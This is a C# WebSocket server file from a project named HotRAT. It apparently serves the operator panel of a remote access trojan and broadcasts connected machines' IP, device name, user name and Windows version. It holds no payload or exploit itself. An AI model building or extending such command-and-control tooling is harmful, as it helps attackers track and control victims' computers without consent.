using HotRAT.Server;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace HotRAT.WSServer.Models
{
    public class WebSocketServer
    {
        private readonly TcpListener _listener;
        public readonly ConcurrentDictionary<string, wsClientConnection> _clients = new();
        
        public WebSocketServer(IPAddress ip, int port)
        {
            _listener = new TcpListener(ip, port);
        }

        public async Task StartAsync()
        {
            _listener.Start();

            while (true)
            {
                TcpClient client = await _listener.AcceptTcpClientAsync();
                _ = Task.Run(() => HandleClientAsync(client));
            }
        }

        private async Task HandleClientAsync(TcpClient tcpClient)
        {
            string clientId = Guid.NewGuid().ToString();
            Console.WriteLine();
            Runtimes.CWrite($"新客户端连接: {clientId}", ConsoleColor.Green, true);
            using NetworkStream stream = tcpClient.GetStream();
            using var reader = new StreamReader(stream, Encoding.UTF8, false, 1024, true);
            using var writer = new StreamWriter(stream, Encoding.UTF8, 1024, true) { AutoFlush = true };

            try
            {
                // 握手
                string? line;
                string secWebSocketKey = "";
                while (!string.IsNullOrEmpty(line = await reader.ReadLineAsync()))
                {
                    if (line.StartsWith("Sec-WebSocket-Key:"))
                        secWebSocketKey = line.Split(':')[1].Trim();
                }

                string acceptKey = Convert.ToBase64String(
                    SHA1.HashData(Encoding.UTF8.GetBytes(secWebSocketKey + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
                );

                string response =
                    "HTTP/1.1 101 Switching Protocols\r\n" +
                    "Upgrade: websocket\r\n" +
                    "Connection: Upgrade\r\n" +
                    $"Sec-WebSocket-Accept: {acceptKey}\r\n\r\n";

                byte[] responseBytes = Encoding.UTF8.GetBytes(response);
                await stream.WriteAsync(responseBytes);

                var connection = new wsClientConnection(clientId, tcpClient, stream);
                _clients.TryAdd(clientId, connection);

                while (tcpClient.Connected)
                {
                    string? msg = await ReceiveMessageAsync(stream);
                    if (msg != null)
                    {
                        Runtimes.CWrite($"收到 [{clientId}] {msg}", ConsoleColor.Yellow, true);
                        await WSHandles.HandleMessage(stream, clientId, msg);
                    }
                    else
                    {
                        break; // 断开
                    }
                }
            }
            catch (Exception ex)
            {
                Runtimes.CWrite($"异常 [{clientId}] Error: {ex.Message}", ConsoleColor.Red, true);
            }
            finally
            {
                _clients.TryRemove(clientId, out _);
                tcpClient.Close();
                Runtimes.CWrite($"[{clientId}] 断开连接", ConsoleColor.Red,true);
            }
        }

        private async Task<string?> ReceiveMessageAsync(NetworkStream stream)
        {
            byte[] header = new byte[2];
            int bytesRead = await stream.ReadAsync(header, 0, 2);
            if (bytesRead != 2) return null;

            bool isMasked = (header[1] & 0b10000000) != 0;
            int msgLen = header[1] & 0b01111111;

            byte[] lengthBytes = new byte[8];
            if (msgLen == 126)
            {
                await stream.ReadAsync(lengthBytes, 0, 2);
                msgLen = BitConverter.ToUInt16(new[] { lengthBytes[1], lengthBytes[0] }, 0);
            }
            else if (msgLen == 127)
            {
                await stream.ReadAsync(lengthBytes, 0, 8);
                msgLen = (int)BitConverter.ToUInt64(lengthBytes, 0);
            }

            byte[] mask = new byte[4];
            if (isMasked)
            {
                await stream.ReadAsync(mask, 0, 4);
            }

            byte[] data = new byte[msgLen];
            await stream.ReadAsync(data, 0, msgLen);

            if (isMasked)
            {
                for (int i = 0; i < data.Length; i++)
                    data[i] ^= mask[i % 4];
            }

            return Encoding.UTF8.GetString(data);
        }

        public static async Task SendMessageAsync(NetworkStream stream, string message)
        {
            byte[] msgBytes = Encoding.UTF8.GetBytes(message);

            byte[] frame;
            if (msgBytes.Length <= 125)
            {
                frame = new byte[2 + msgBytes.Length];
                frame[0] = 0x81;
                frame[1] = (byte)msgBytes.Length;
                Array.Copy(msgBytes, 0, frame, 2, msgBytes.Length);
            }
            else if (msgBytes.Length <= ushort.MaxValue)
            {
                frame = new byte[4 + msgBytes.Length];
                frame[0] = 0x81;
                frame[1] = 126;
                frame[2] = (byte)(msgBytes.Length >> 8);
                frame[3] = (byte)(msgBytes.Length & 0xFF);
                Array.Copy(msgBytes, 0, frame, 4, msgBytes.Length);
            }
            else
            {
                frame = new byte[10 + msgBytes.Length];
                frame[0] = 0x81;
                frame[1] = 127; 

                for (int i = 7; i >= 0; i--)
                {
                    frame[9 - i] = (byte)(msgBytes.Length >> (8 * i));
                }
                Array.Copy(msgBytes, 0, frame, 10, msgBytes.Length);
            }

            await stream.WriteAsync(frame);
        }

        public static void UpdataAllClients()
        {
            var info = JsonConvert.SerializeObject(new
            {
                type = "CLIENTS",
                data = Runtimes._clients.Values.Select(connects => new
                {
                    id = connects.ConnectionId,
                    ip = connects.Info.IP,
                    port = connects.Info.Port,
                    deviceName = connects.Info.DeviceName,
                    userName = connects.Info.UserName,
                    version = connects.Info.WindowsVersion,
                    time = connects.Info.ConnectTime
                }).ToList()
            });
            foreach (var cons in Runtimes.WSserver._clients)
            {
                _ = SendMessageAsync(cons.Value.Stream, info);
            }
        }

        public async Task BroadcastAsync(string message)
        {
            foreach (var pair in _clients)
            {
                try
                {
                    await SendMessageAsync(pair.Value.Stream, message);
                }
                catch
                {
                    _clients.TryRemove(pair.Key, out _);
                }
            }
        }

        public class wsClientConnection
        {
            public string Id { get; }
            public TcpClient TcpClient { get; }
            public NetworkStream Stream { get; }

            public wsClientConnection(string id, TcpClient tcpClient, NetworkStream stream)
            {
                Id = id;
                TcpClient = tcpClient;
                Stream = stream;
            }
        }
    }
}
